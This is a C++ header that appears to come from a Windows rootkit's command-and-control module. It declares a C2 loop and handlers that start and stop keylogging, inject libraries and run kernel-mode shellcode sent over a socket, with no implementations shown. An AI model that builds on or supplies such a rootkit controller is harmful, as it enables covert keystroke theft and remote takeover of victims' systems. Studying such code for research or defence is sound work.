#pragma once

#include "Socket.h"
#include "RootkitDriver.h"

#include <string>

DWORD RunC2(PVOID);

VOID HandleStartKeylogging(RootkitDriver& Driver, const std::string& KeyloggingData, Socket& Conn);

VOID HandleEndKeylogging(RootkitDriver& Driver);

VOID HandleInjectLibrary(RootkitDriver& Driver, const std::string& Parameters);

VOID HandleRunKmShellcode(RootkitDriver& Driver, const std::string& Parameters, Socket& Conn);
